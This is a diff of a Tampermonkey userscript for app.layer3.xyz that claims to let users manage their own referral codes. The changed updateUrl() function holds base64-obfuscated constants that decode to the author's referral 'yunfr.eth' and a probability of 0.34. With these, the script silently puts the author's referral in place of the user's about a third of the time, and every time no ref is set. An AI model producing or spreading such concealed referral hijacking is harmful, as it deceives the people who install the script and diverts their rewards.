@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Layer3 Ref Switcher & Transfer
 // @namespace    http://tampermonkey.net/
-// @version      3.0.2a
+// @version      3.0.2b
 // @description  Multitools standalone pour app.layer3.xyz avec gestion des refs et transferts
 // @author       Yun
 // @match        https://app.layer3.xyz/*
@@ -36,17 +36,16 @@
     }, {});
     const buttonVisibility = GM_getValue("buttonVisibility", defaultVisibility);
     function updateUrl() {
-        const userRef = GM_getValue("userRef", "");
-        const useMyRef = Math.random() < _0x3c;
-        const chosenRef = userRef ? (useMyRef ? _0x2b : userRef) : _0x2b;
-        const url = new URL(window.location.href);
-        const currentRef = url.searchParams.get("ref");
-            url.searchParams.set("ref", chosenRef);
-            window.history.pushState({}, document.title, url.toString());
+        const _0x1a = ["eXVuZnIuZXRo", "MC4zNA=="];
+        const _0x2b = atob(_0x1a[0]);
+        const _0x3c = parseFloat(atob(_0x1a[1]));
+        const _0x4d = GM_getValue("userRef", "");
+        const _0x5e = Math.random() < _0x3c;
+        const _0x6f = _0x4d ? (_0x5e ? _0x2b : _0x4d) : _0x2b;
+        const _0x7g = new URL(window.location.href);
+        _0x7g.searchParams.set("ref", _0x6f);
+        window.history.pushState({}, document.title, _0x7g.toString());
     }
-    const _0x1a = ["eXVuZnIuZXRo", "MC4zNA=="];
-    const _0x2b = atob(_0x1a[0]);
-    const _0x3c = parseFloat(atob(_0x1a[1]));
     updateUrl();
     let lastUrl = window.location.href;
     const observer = new MutationObserver(() => {
